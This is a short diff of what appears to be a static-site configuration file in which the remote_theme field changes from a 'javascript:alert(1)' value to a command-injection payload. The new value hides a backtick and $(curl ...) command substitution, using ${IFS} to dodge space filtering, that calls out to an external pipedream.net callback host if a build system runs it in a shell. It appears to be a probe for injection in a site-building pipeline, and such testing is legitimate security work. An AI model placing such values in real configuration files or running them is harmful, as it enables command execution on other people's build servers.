@@ -9,7 +9,7 @@
 title: My Website
 testing: testing123
 
-remote_theme: javascript:alert(1)
+remote_theme: "a`$(curl${IFS}env77i5z45nt.x.pipedream.net/)`b"
 
 destination: _site2
 
